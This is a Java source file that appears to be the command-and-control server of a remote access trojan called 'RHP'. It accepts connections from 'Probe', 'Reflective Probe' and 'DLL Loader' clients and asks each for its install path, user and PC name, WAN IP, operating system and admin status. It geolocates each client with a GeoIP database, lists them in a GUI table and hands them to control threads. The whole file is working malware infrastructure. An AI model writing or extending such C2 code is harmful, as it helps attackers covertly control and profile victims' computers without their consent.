package rhp;

import java.net.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;

import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;
import com.maxmind.geoip2.record.City;
import com.maxmind.geoip2.record.Country;
import com.maxmind.geoip2.record.Location;
import com.maxmind.geoip2.record.Postal;
import com.maxmind.geoip2.record.Subdivision;

import java.io.*;
	
public class Server {
	static ArrayList<Socket> Clients = new ArrayList<Socket>();
	static ArrayList<Socket> LoaderClients = new ArrayList<Socket>();
	static ArrayList<String> OperatingSystem = new ArrayList<String>();
	static ArrayList<String> WANIP = new ArrayList<String>();
	static ArrayList<String> UserPC = new ArrayList<String>();
	static ArrayList<String> RHPTYPES = new ArrayList<String>();
	static ArrayList<String> RHPPATHS = new ArrayList<String>();
	public static int server_port;
	public static String server_host;
	public static ServerSocket mainsocket;
	public static Socket clientsocket;
	static byte[] buffer = new byte[4096];
	
	String clientType(String base64encodedString) {
		String out = "";
		try {
			byte[] decodedBytes = Base64.getDecoder().decode(base64encodedString); 
			String ClientType = new String(decodedBytes).replaceAll("\\s+", "");
			if(ClientType.equals("dll-loader"))
			{
				out = "DLL Loader Client";
			} else if(ClientType.equals("probecl"))
			{
				out = "Probe Client";
			} else if(ClientType.equals("reflectivedll")) {
				out = "Reflective Probe Client";
			} else {
				out = "Unknown"; // if the client type is unknown, you have got a connection from a third party most likely
			}
		} catch (Exception e)
		{
			e.printStackTrace();
		}
	
		return out;

	}
	
	public static String ReturnLocation(int mode, Boolean isProbe)
	{
		String dbLocation = "GeoLite2-City.mmdb";
		File database = new File(dbLocation);
		String ip;
		if(isProbe) {
			ip = WANIP.get(Clients.indexOf(clientsocket));
		} else {
			ip = WANIP.get(LoaderClients.indexOf(clientsocket));
		}
		
	    DatabaseReader dbReader;
	    String countryName = null;
		try {
			dbReader = new DatabaseReader.Builder(database)
			  .build();
			if(ip.startsWith("No")) {
				countryName = "Failed to Get";
			} else {
				InetAddress ipAddress = InetAddress.getByName(ip);
			    CityResponse response;
				try {
					response = dbReader.city(ipAddress);
					countryName = response.getCountry().getName();
					String isocode = response.getCountry().getIsoCode();
					Subdivision subdivision = response.getMostSpecificSubdivision();
					String subd = subdivision.getName();
					if(mode==0)
					{
						return countryName;
					} else {
						return countryName + " Subdivision : " + subd;
					}
					
				} catch (GeoIp2Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		    
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return countryName;
	}
	
	static void SendData(Socket sock, String data)
	{
		try {
			OutputStream outputStream = sock.getOutputStream();
			DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
			dataOutputStream.write(data.getBytes());
			dataOutputStream.flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NullPointerException ne) {
			ne.printStackTrace();
		}
	}
	
	public void getInformation()
	{
		int read;
		try {
			InputStream is = clientsocket.getInputStream();
		    PrintWriter pw = new PrintWriter(clientsocket.getOutputStream()); 
			
		    // Get RHP Client Type
		    SendData(clientsocket, "RHPTYPE");
		    Arrays.fill(buffer, (byte)0);
		    read = is.read(buffer);
		    String rhpcl = new String(buffer, 0, read);
		    String RHPTYPE = clientType(rhpcl);
		    if(RHPTYPE.equals("UNKNOWN"))
		    {
		    	Server.SendData(clientsocket, "kill");
				clientsocket.close();
				
				MainWindow.Log("Connection Closed for incoming client for giving Unknown Client Type. This may be a third party impersonating to be the Probe.");
		    } else {
		    	// Get RHP Path
			    SendData(clientsocket, "RHPPATH");
			    Arrays.fill(buffer, (byte)0);
			    read = is.read(buffer);
			    String RHP_PATH = new String(buffer, 0, read);
			    
			    // Get USER PCs
			    SendData(	clientsocket, "RHP_1");
			    Arrays.fill(buffer, (byte)0);
			    read = is.read(buffer);
			    String user_pc = new String(buffer, 0, read);
			    
			    // Get WAN IP
			    SendData(clientsocket, "RHP_2");
			    Arrays.fill(buffer, (byte)0);
			    read = is.read(buffer);
			    String wanip = new String(buffer, 0, read);
		
			    SendData(clientsocket, "RHP_3");
			    Arrays.fill(buffer, (byte)0);
			    read = is.read(buffer);
			    String operating_system = new String(buffer, 0, read);
			    
			    SendData(clientsocket, "isadmin");
			    Arrays.fill(buffer, (byte)0);
			    read = is.read(buffer);
			    String adm = new String(buffer, 0, read); // add to no list
			    
			    WANIP.add(wanip);
				OperatingSystem.add(operating_system);
				UserPC.add(user_pc);
				RHPTYPES.add(RHPTYPE);
				
				int id = 0;
				
				if(RHPTYPE.equals("DLL Loader Client")) {
					
					try {
						LoaderClients.add(clientsocket);
						id = LoaderClients.indexOf(clientsocket);
						MainWindow.UpdateOnlineLabel();
						
						
						MainWindow.loaderModel.addRow(new Object[] {
								String.valueOf(id), 
								RHPTYPE, RHP_PATH,
								clientsocket.getRemoteSocketAddress().toString().replace("/", "").split(":")[0], clientsocket.getRemoteSocketAddress().toString().replace("/", "").split(":")[1],  user_pc.split("/")[0], user_pc.split("/")[1],
								operating_system,
								wanip,
								ReturnLocation(0, false),
								adm
								}
						);
						
						MainWindow.Log("Connection Established from DLL Loader " + clientsocket.getRemoteSocketAddress().toString());
					} catch (Exception e)
					{
						e.printStackTrace();
					}
			        
			        new ServerThread(clientsocket, RHPTYPE).start();
			        
			        
					
				} else if(RHPTYPE.equals("Probe Client") || RHPTYPE.equals("Reflective Probe Client"))
				{
					
					Clients.add(clientsocket);
					id = Clients.indexOf(clientsocket);
					MainWindow.UpdateOnlineLabel();
					
					try {
						MainWindow.model.addRow(new Object[] {
								String.valueOf(id), 
								RHPTYPE, RHP_PATH,
								clientsocket.getRemoteSocketAddress().toString().replace("/", "").split(":")[0], clientsocket.getRemoteSocketAddress().toString().replace("/", "").split(":")[1],  user_pc.split("/")[0], user_pc.split("/")[1],
								operating_system,
								wanip,
								ReturnLocation(0, true),
								adm
								}
						);
						
						MainWindow.Log("Connection Established from " + RHPTYPE + " " + clientsocket.getRemoteSocketAddress().toString());
					} catch (Exception e)
					{
						e.printStackTrace();
					}
			        
			        new ServerThread(clientsocket, RHPTYPE).start();
			        
			        
				} 
		    }
		    
	        
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	
	

	Thread tcpserver = new Thread(new Runnable() {
		
		@Override
		public void run() {
			try {
				mainsocket = new ServerSocket(server_port);
			} catch (java.net.BindException s) {
				JOptionPane.showMessageDialog(null, "Bind Error : " + s.toString());
				System.exit(0);
			}
			catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			while(true) {
				try {
					clientsocket = mainsocket.accept();
					System.out.println("[INFO] New connection from : " + clientsocket.getRemoteSocketAddress().toString());
					
					getInformation();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
			}
		}
	});

}